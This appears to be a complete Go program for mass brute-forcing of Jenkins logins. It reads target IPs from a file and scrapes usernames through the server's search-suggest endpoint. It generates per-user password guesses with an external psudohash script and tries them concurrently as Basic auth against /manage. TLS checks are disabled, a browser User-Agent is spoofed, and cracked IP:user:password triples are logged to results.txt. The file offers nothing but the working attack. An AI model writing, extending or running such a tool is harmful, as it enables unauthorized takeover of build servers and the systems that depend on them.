package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"time"
)

type Results struct {
	Good          []IpUserPass
	TotalIP       int
	CurrentCursor int
}

var Data Results

type IpUserPass struct {
	IP       string
	User     string
	Password string
}

var (
	resultsFile   *os.File
	resultsFileMu sync.Mutex
)

var (
	errorsFile   *os.File
	errorsFileMu sync.Mutex
)

var (
	ErrFoundValidCreds   = errors.New("found valid credentials")
	ErrTargetUnreachable = errors.New("target unreachable")
)

type IPandThreads struct {
	IP      string
	Threads int
}

func countTotalNoOfIP(ipFile string) (int, error) {
	f, err := os.Open(ipFile)
	if err != nil {
		return 0, err
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	total := 0
	for scanner.Scan() {
		total++
	}
	if err := scanner.Err(); err != nil {
		return 0, err
	}
	return total, nil
}

var httpClient = &http.Client{
	Timeout: 10 * time.Second,
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	},
}

func checkJenkinsCreds(ctx context.Context, input IpUserPass) error {
	req, err := http.NewRequestWithContext(ctx, "GET", input.IP+"/manage", nil)
	if err != nil {
		return err
	}
	auth := base64.StdEncoding.EncodeToString([]byte(input.User + ":" + input.Password))
	req.Header.Set("Authorization", "Basic "+auth)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")

	resp, err := httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("%w: %v", ErrTargetUnreachable, err)
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	switch resp.StatusCode {
	case 200:
		if err := saveResults(input.IP, input.User, input.Password); err != nil {
			// saveResults failed
		}
		return ErrFoundValidCreds
	case 403:
		if err := saveResults(input.IP, input.User, input.Password); err != nil {
			// saveResults failed
		}
		return ErrFoundValidCreds
	default:
		return nil
	}
}

func openResultsFile() (*os.File, error) {
	resultsFileMu.Lock()
	defer resultsFileMu.Unlock()

	if resultsFile == nil {
		file, err := os.OpenFile("results.txt", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
		if err != nil {
			return nil, err
		}
		resultsFile = file
	}
	return resultsFile, nil
}

func openErrorsFile() (*os.File, error) {
	errorsFileMu.Lock()
	defer errorsFileMu.Unlock()

	if errorsFile == nil {
		file, err := os.OpenFile("errors.txt", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
		if err != nil {
			return nil, err
		}
		errorsFile = file
	}
	return errorsFile, nil
}

var goodMu sync.Mutex
var progressMu sync.Mutex

func writeProgress(total, current int) {
	progressMu.Lock()
	defer progressMu.Unlock()

	_ = os.WriteFile("progress.txt",
		[]byte(fmt.Sprintf("total=%d\ncurrent=%d\n", total, current)),
		0644,
	)
}

func saveResults(IP, Username, Password string) error {
	goodMu.Lock()
	Data.Good = append(Data.Good, IpUserPass{IP: IP, User: Username, Password: Password})
	goodMu.Unlock()
	resultsFile, err := openResultsFile()
	if err != nil {
		return err
	}

	resultsFileMu.Lock()
	defer resultsFileMu.Unlock()

	_, err = resultsFile.WriteString(IP + ":" + Username + ":" + Password + "\n")
	if err != nil {
		return err
	}

	err = resultsFile.Sync()
	if err != nil {
		return err
	}
	return nil
}

func saveError(IP, errorMsg string) error {
	errorsFile, err := openErrorsFile()
	if err != nil {
		return err
	}

	errorsFileMu.Lock()
	defer errorsFileMu.Unlock()

	_, err = errorsFile.WriteString(IP + "\n")
	if err != nil {
		return err
	}

	err = errorsFile.Sync()
	if err != nil {
		return err
	}
	return nil
}

func generatePasswords(parlai, urlai string, ctx context.Context) <-chan string {
	cmd := exec.CommandContext(ctx, "./psudohash.sh", "-w", urlai, "-o", parlai)
	err := cmd.Run()

	if err != nil {
		ch := make(chan string)
		close(ch)
		return ch
	}

	file, err := os.Open(parlai)
	if err != nil {
		ch := make(chan string)
		close(ch)
		return ch
	}

	passwordsChan := make(chan string)

	go func() {
		defer func() {
			_ = file.Close()
			_ = os.Remove(parlai)
			close(passwordsChan)
		}()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			password := strings.TrimSpace(scanner.Text())
			if password == "" {
				continue
			}

			select {
			case <-ctx.Done():
				return
			case passwordsChan <- password:
			}
		}
		if err := scanner.Err(); err != nil {
			// Error reading password file
		}

	}()
	return passwordsChan
}

func generateRandomNumber() int {
	source := rand.NewSource(time.Now().UnixNano())
	rng := rand.New(source)
	return rng.Intn(100000)
}

func processCredsForIP(parentCtx context.Context, ip string, workers int) error {
	users, err := ExtractingUser(parentCtx, ip)
	if err != nil {
		if saveErr := saveError(ip, err.Error()); saveErr != nil {
			// Failed to save error
		}
		return nil
	}

	ctx, cancel := context.WithCancel(parentCtx)
	defer cancel()

	jobs := make(chan IpUserPass, workers*600)
	errCh := make(chan error, 1)

	var wg sync.WaitGroup
	wg.Add(workers)

	for i := 0; i < workers; i++ {
		go func(workerID int) {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case creds, ok := <-jobs:
					if !ok {
						return
					}

					if err := checkJenkinsCreds(ctx, creds); err != nil {
						if errors.Is(err, ErrFoundValidCreds) {
							cancel()
							return
						}
						if errors.Is(err, ErrTargetUnreachable) {
							cancel()
							return
						}

						select {
						case errCh <- fmt.Errorf("worker %d: %w", workerID, err):
						default:
						}
						cancel()
						return
					}
				}
			}
		}(i)
	}

forLoop:
	for _, user := range users {
		randomNumber := strconv.Itoa(generateRandomNumber())
		userFile := fmt.Sprintf("%s", user)

		passwordFile := fmt.Sprintf("%s_password.txt", randomNumber)
		passwords := generatePasswords(passwordFile, userFile, ctx)
	valuesLoop:
		for {
			select {
			case <-ctx.Done():
				break forLoop

			case password, ok := <-passwords:
				if !ok {
					break valuesLoop
				}

				creds := IpUserPass{
					IP:       ip,
					User:     user,
					Password: password,
				}

				select {
				case <-ctx.Done():
					break forLoop
				case jobs <- creds:
				}
			}
		}
	}

	close(jobs)
	wg.Wait()

	select {
	case e := <-errCh:
		return e
	default:
		return nil
	}
}

func scanIPsFromFile(ctxMenu context.Context, ipFile string, ipWorkers int, processCredsForIP func(ctx context.Context, ip string, workers int) error) error {
	f, err := os.Open(ipFile)
	if err != nil {
		return err
	}
	defer f.Close()

	ipJobs := make(chan IPandThreads, ipWorkers*2)
	errCh := make(chan error, 1)

	ctx, cancel := context.WithCancel(ctxMenu)
	defer cancel()

	var wg sync.WaitGroup
	wg.Add(ipWorkers)

	for i := 0; i < ipWorkers; i++ {
		go func(workerID int) {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case ipData, ok := <-ipJobs:
					if !ok {
						return
					}
					if err := processCredsForIP(ctx, ipData.IP, ipData.Threads); err != nil {
						select {
						case errCh <- fmt.Errorf("ip worker %d (%s): %w", workerID, ipData.IP, err):
						default:
						}
						cancel()
						return
					}
				}
			}
		}(i)
	}

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		if ctx.Err() != nil {
			break
		}
		ipData := strings.TrimSpace(scanner.Text())
		parts := strings.SplitN(ipData, ",", 2)
		if len(parts) != 2 {
			continue
		}
		threads, err := strconv.Atoi(parts[1])
		if err != nil {
			continue
		}
		Data.CurrentCursor++
		writeProgress(Data.TotalIP, Data.CurrentCursor)

		ipJob := IPandThreads{IP: parts[0], Threads: threads}

		select {
		case <-ctx.Done():
			return nil
		case ipJobs <- ipJob:
		}
	}

	if err := scanner.Err(); err != nil {
		cancel()
		close(ipJobs)
		wg.Wait()
		return err
	}

	close(ipJobs)
	wg.Wait()

	select {
	case e := <-errCh:
		return e
	default:
		return nil
	}
}

type Suggestion struct {
	Group string `json:"group"`
	Icon  string `json:"icon"`
	Name  string `json:"name"`
	Type  string `json:"type"`
	URL   string `json:"url"`
}

type SearchResult struct {
	Class       string       `json:"_class"`
	Suggestions []Suggestion `json:"suggestions"`
}

func ExtractingUser(ctx context.Context, input string) ([]string, error) {
	req, err := http.NewRequestWithContext(ctx, "GET", input+"/search/suggest?query", nil)
	if err != nil {
		return nil, fmt.Errorf("error creating request: %v", err)
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")

	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("error making request: %v", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("error reading response body: %v", err)
	}
	if resp.StatusCode == http.StatusForbidden {
		return []string{"admin"}, nil
	}
	if resp.StatusCode == http.StatusOK {
		var result SearchResult
		if err := json.Unmarshal(body, &result); err != nil {
			return nil, fmt.Errorf("invalid JSON: %w\nraw: %s", err, string(body))
		}
		var userIDs []string

		for _, s := range result.Suggestions {
			if s.Group == "Users" {
				userID := strings.TrimPrefix(s.URL, "/user/")
				userID = strings.Trim(userID, "/")
				userIDs = append(userIDs, userID)
			}
		}
		if len(userIDs) == 0 {
			userIDs = append(userIDs, "admin")
		}
		return userIDs, nil
	} else {
		return nil, fmt.Errorf("failed to get data, status code: %d", resp.StatusCode)
	}
}

func main() {
	total, err := countTotalNoOfIP("ips.txt")
	if err != nil {
		return
	}
	Data.TotalIP = total

	//   Menu: Set number of workers
	ipWorkers := 50

	processFunc := func(ctx context.Context, ip string, workers int) error {
		return processCredsForIP(ctx, ip, workers)
	}
	fmt.Println("scan started")
	if err := scanIPsFromFile(context.Background(), "ips.txt", ipWorkers, processFunc); err != nil {
		fmt.Println("scan error:", err)
	} else {
		fmt.Println("scan finished")
	}
}
